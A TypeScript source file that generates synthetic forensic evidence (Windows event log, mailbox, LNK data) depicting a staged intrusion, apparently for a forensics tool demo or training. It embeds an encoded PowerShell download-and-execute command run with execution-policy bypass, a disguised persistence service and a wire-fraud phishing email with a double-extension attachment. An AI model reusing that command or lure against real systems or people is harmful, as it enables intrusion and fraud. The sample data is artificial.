// src/lib/sampleEvidence.ts
import { Buffer } from "buffer";
function createSampleForensicFiles() {
  const evtxXmlContent = `
<Events>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}" />
      <EventID>4624</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>12544</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2024-09-18T14:22:10.120000Z" />
      <EventRecordID>1001</EventRecordID>
      <Correlation />
      <Execution ProcessID="688" ThreadID="1420" />
      <Channel>Security</Channel>
      <Computer>FINANCE-SRV-01.corp.local</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-18</Data>
      <Data Name="SubjectUserName">SYSTEM</Data>
      <Data Name="TargetUserSid">S-1-5-21-128491823-8192847-1002</Data>
      <Data Name="TargetUserName">Administrator</Data>
      <Data Name="LogonType">10</Data>
      <Data Name="IpAddress">192.168.1.45</Data>
      <Data Name="IpPort">54812</Data>
      <Data Name="WorkstationName">WORKSTATION-SEC</Data>
    </EventData>
  </Event>

  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}" />
      <EventID>4625</EventID>
      <Version>0</Version>
      <Level>3</Level>
      <Task>12544</Task>
      <TimeCreated SystemTime="2024-09-18T14:25:34.450000Z" />
      <EventRecordID>1002</EventRecordID>
      <Channel>Security</Channel>
      <Computer>FINANCE-SRV-01.corp.local</Computer>
    </System>
    <EventData>
      <Data Name="TargetUserName">svc_backup</Data>
      <Data Name="FailureReason">%%2313</Data>
      <Data Name="SubStatus">0xc000006a</Data>
      <Data Name="IpAddress">10.0.8.212</Data>
      <Data Name="WorkstationName">ATTACK-HOST</Data>
    </EventData>
  </Event>

  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <TimeCreated SystemTime="2024-09-18T14:28:15.890000Z" />
      <EventRecordID>1003</EventRecordID>
      <Channel>Security</Channel>
      <Computer>FINANCE-SRV-01.corp.local</Computer>
    </System>
    <EventData>
      <Data Name="SubjectUserName">Administrator</Data>
      <Data Name="NewProcessName">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
      <Data Name="CommandLine">powershell.exe -ExecutionPolicy Bypass -NoProfile -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAA=</Data>
      <Data Name="ParentProcessName">C:\\Windows\\System32\\cmd.exe</Data>
    </EventData>
  </Event>

  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Service Control Manager" Guid="{555908d1-a6d7-4695-8e1e-26931b2012f4}" />
      <EventID>7045</EventID>
      <Version>0</Version>
      <Level>3</Level>
      <Task>0</Task>
      <TimeCreated SystemTime="2024-09-18T14:31:02.110000Z" />
      <EventRecordID>1004</EventRecordID>
      <Channel>System</Channel>
      <Computer>FINANCE-SRV-01.corp.local</Computer>
    </System>
    <EventData>
      <Data Name="ServiceName">WindowsUpdateCheckSvc</Data>
      <Data Name="ImagePath">C:\\Users\\Public\\UpdateHelper.exe -daemon</Data>
      <Data Name="ServiceType">user mode service</Data>
      <Data Name="StartType">auto start</Data>
    </EventData>
  </Event>

  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Eventlog" Guid="{fc65ddd8-d6ef-4962-83d5-6e5cfe9ce148}" />
      <EventID>1102</EventID>
      <Version>0</Version>
      <Level>1</Level>
      <Task>103</Task>
      <TimeCreated SystemTime="2024-09-18T14:35:40.000000Z" />
      <EventRecordID>1005</EventRecordID>
      <Channel>Security</Channel>
      <Computer>FINANCE-SRV-01.corp.local</Computer>
    </System>
    <UserData>
      <LogFileCleared xmlns="http://manifests.microsoft.com/win/2004/08/windows/eventlog">
        <SubjectUserName>Administrator</SubjectUserName>
        <SubjectDomainName>CORP</SubjectDomainName>
      </LogFileCleared>
    </UserData>
  </Event>
</Events>
`;
  const evtxHeader = Buffer.alloc(512);
  evtxHeader.write("ElfFile\0", 0, 8, "ascii");
  const evtxBlob = new Blob([evtxHeader, evtxXmlContent], { type: "application/octet-stream" });
  const evtxFile = new File([evtxBlob], "Security_Audit.evtx", {
    type: "application/octet-stream",
    lastModified: Date.now() - 3600 * 1e3 * 24
  });
  const pstHeader = Buffer.alloc(512);
  pstHeader[0] = 33;
  pstHeader[1] = 66;
  pstHeader[2] = 68;
  pstHeader[3] = 78;
  pstHeader.writeUInt16LE(23, 10);
  pstHeader[461] = 0;
  const emailsData = `
From: "Executive Finance" <c-suite@wire-transfers-intl.com>
To: analyst@corp.local, cfo@corp.local
Subject: URGENT: Outstanding Invoice & Immediate Wire Transfer Required
Date: Wed, 18 Sep 2024 14:10:00 +0000
Message-ID: <msg-20240918-001@wire-transfers-intl.com>
Importance: High
X-Priority: 1
filename="Invoice_Overdue_Statement.pdf.exe"

Dear Accounting Team,

Please review the attached invoice immediately. The international supplier account has not received payment for Q3 software licenses. Failure to wire payment of $48,500 by end of day will result in enterprise service suspension.

Kindly execute the transfer using the banking details specified in the attached PDF execution payload.

Regards,
Executive Finance Desk

---END-EMAIL---

From: "Sarah Jenkins" <s.jenkins@partner-consulting.com>
To: analyst@corp.local
Subject: Q3 Threat Intelligence & Incident Response Review
Date: Wed, 18 Sep 2024 10:45:00 +0000
Message-ID: <msg-20240918-002@partner-consulting.com>
Importance: Normal
filename="IR_Threat_Report_Q3.docx"

Hi Alex,

Attached is our compiled quarterly threat hunting dossier for your security operations center. Please note the recent surge in LOLBin living-off-the-land attacks and credential harvesting targeting Microsoft Active Directory environments.

Let us know if your forensic examiners need additional assistance correlating host logs.

Best regards,
Sarah Jenkins
Senior Forensic Analyst | Partner Consulting

---END-EMAIL---

From: "Internal IT Helpdesk" <helpdesk@corp.local>
To: all-staff@corp.local
Subject: Scheduled Maintenance Notice: Active Directory Domain Controller
Date: Tue, 17 Sep 2024 16:30:00 +0000
Message-ID: <msg-20240917-003@corp.local>
Importance: Normal

All,

Please be aware that IT Operations will be applying monthly cumulative security updates to domain controllers this weekend from 22:00 to 02:00 UTC. Brief network logon interruptions may occur during reboot intervals.

Thank you,
IT Infrastructure Team
`;
  const pstBlob = new Blob([pstHeader, emailsData], { type: "application/octet-stream" });
  const pstFile = new File([pstBlob], "Mailbox_Investigation.pst", {
    type: "application/octet-stream",
    lastModified: Date.now() - 3600 * 1e3 * 48
  });
  const lnkBuffer = Buffer.alloc(2048);
  lnkBuffer[0] = 76;
  lnkBuffer[1] = 0;
  lnkBuffer[2] = 0;
  lnkBuffer[3] = 0;
  const targetPath1 = "C:\\Users\\Administrator\\AppData\\Local\\Temp\\Invoice_Overdue_Statement.pdf.exe";
  const targetPath2 = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
  const targetPath3 = "C:\\Users\\Public\\UpdateHelper.exe";
  const targetPath4 = "C:\\Users\\Alex\\Documents\\Financial_Statement_2024.xlsx";
  lnkBuffer.write(targetPath1, 100, "ascii");
  lnkBuffer.write(targetPath2, 400, "ascii");
  lnkBuffer.write(targetPath3, 700, "ascii");
  lnkBuffer.write(targetPath4, 1e3, "ascii");
  const lnkBlob = new Blob([lnkBuffer], { type: "application/octet-stream" });
  const lnkFile = new File([lnkBlob], "Recent_Activity_LNK.lnk", {
    type: "application/octet-stream",
    lastModified: Date.now() - 3600 * 1e3 * 12
  });
  return [evtxFile, pstFile, lnkFile];
}
export {
  createSampleForensicFiles
};
/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */
